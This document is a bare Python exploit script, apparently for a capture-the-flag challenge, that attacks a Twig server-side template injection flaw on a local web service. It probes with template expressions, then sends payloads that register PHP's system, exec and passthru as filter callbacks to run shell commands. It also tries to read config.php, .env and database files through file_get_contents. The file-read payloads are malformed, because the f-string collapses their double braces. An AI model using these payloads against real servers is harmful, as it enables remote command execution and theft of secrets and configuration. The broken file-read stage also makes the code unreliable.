import requests
import urllib.parse
import re
import time

target_url = "http://127.0.0.1:8080/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

print("Testing target availability...")
try:
    test_resp = requests.get(target_url, timeout=10)
    print(f"[+] Target accessible - Status: {test_resp.status_code}")
except Exception as e:
    print(f"[-] Target not accessible: {e}")
    print("[+] Still attempting exploitation with error handling...")

print("\n" + "="*60)
print("ATTACKING TWIG SSTI VULNERABILITY")
print("="*60)

# Test basic SSTI first
basic_payloads = [
    '{{7*7}}',
    '{{"test"}}',
    '{{phpinfo()}}',
    '{{_self}}'
]

for payload in basic_payloads:
    print(f"\n[*] Testing: {payload}")
    try:
        encoded = urllib.parse.quote_plus(payload)
        response = requests.post(target_url, headers=headers, data=f"name={encoded}", timeout=15)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:200]}")
        if "49" in response.text or "7*7" in response.text:
            print("[+] Basic SSTI confirmed!")
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n" + "="*60)
print("ATTEMPTING COMMAND EXECUTION")
print("="*60)

# Try to list files
command_payloads = [
    '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls")}}',
    '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls")}}',
    '{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("ls -la")}}',
]

for i, payload in enumerate(command_payloads, 1):
    print(f"\n[{i}] Sending payload: {payload[:60]}...")
    try:
        encoded = urllib.parse.quote_plus(payload)
        response = requests.post(target_url, headers=headers, data=f"name={encoded}", timeout=15)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}")
        
        # Check for files
        if any(x in response.text for x in ["total", "drwx", "-rw", ".php", ".txt"]):
            print(f"[+] FILES FOUND!")
            print(response.text)
            break
        else:
            print(f"[-] No file listing")
    except Exception as e:
        print(f"[-] Error with payload {i}: {e}")

print("\n" + "="*60)
print("READING COMMON FILES")
print("="*60)

files_to_try = ["index.php", "config.php", ".env", "articles.txt", "posts.txt", "data.txt", "database.sqlite"]

for filename in files_to_try:
    print(f"\n[*] Reading: {filename}")
    read_payload = f'{{_self.env.registerUndefinedFilterCallback("file_get_contents")}}{{_self.env.getFilter("{filename}")}}'
    
    try:
        encoded = urllib.parse.quote_plus(read_payload)
        response = requests.post(target_url, headers=headers, data=f"name={encoded}", timeout=15)
        
        if response.status_code == 200 and response.text and "error" not in response.text.lower():
            print(f"[+] SUCCESS reading {filename}:")
            print("-" * 40)
            print(response.text)
            print("-" * 40)
            
            # Look for flags
            if "FLAG{" in response.text.upper():
                print(f"[!] FLAG POTENTIALLY FOUND in {filename}!")
        else:
            print(f"[-] No useful content")
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[+] Script execution complete")
